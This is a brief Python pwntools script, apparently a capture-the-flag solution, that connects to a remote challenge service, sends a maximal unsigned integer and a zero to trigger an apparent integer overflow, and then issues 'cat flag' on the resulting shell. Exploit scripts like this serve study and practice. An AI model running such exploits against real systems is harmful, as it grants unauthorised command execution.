import pwn

conn = pwn.connect('3.71.110.92', 30060)

conn.recvuntil(b': ')
conn.sendline(str(int(0xffffffff)).encode())
conn.recv()
conn.sendline(str(0).encode())
conn.recv()


conn.recv()
conn.sendline(b'cat flag')
conn.recv()

conn.close()